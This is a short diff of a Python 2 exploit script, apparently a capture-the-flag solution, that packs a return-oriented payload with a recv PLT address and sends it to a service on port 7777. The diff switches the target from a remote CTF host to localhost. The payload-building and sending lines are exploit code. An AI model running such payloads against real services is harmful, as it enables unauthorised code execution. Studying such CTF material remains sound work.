@@ -33,7 +33,7 @@ payload+=p32(recv_plt)  # system call
 payload+=p32(0)
 payload+=p32(data)
 
-s = connect("stealthee.kr", 7777)
+s = connect("0", 7777)
 print s.recv()
 s.send(payload)
 time.sleep(0.5)
